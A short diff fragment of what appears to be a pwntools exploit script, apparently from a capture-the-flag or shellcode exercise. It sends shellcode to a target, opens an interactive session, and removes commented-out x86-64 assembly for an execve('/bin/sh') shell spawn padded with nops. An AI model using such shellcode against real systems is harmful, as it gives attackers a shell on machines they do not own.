@@ -31,38 +31,3 @@ if __name__ == "__main__":
     )
     io.sendline(shellcode)
     io.interactive()
-    # xor    rax, rax
-    # nop
-
-    # push   rax
-    # nop
-    # nop
-    # nop
-    # nop
-
-    # mov    rdi, 0x68732f6e69622f
-    # push   rdi
-    # nop
-    # nop
-    # nop
-
-    # mov    rdi, rsp
-    # nop
-    # nop
-
-    # xor    rsi, rsi
-    # nop
-    # nop
-
-    # xor    rdx, rdx
-    # nop
-    # nop
-
-    # mov    al, 59
-    # nop
-    # nop
-    # nop
-
-    # syscall
-    # nop
-    # nop
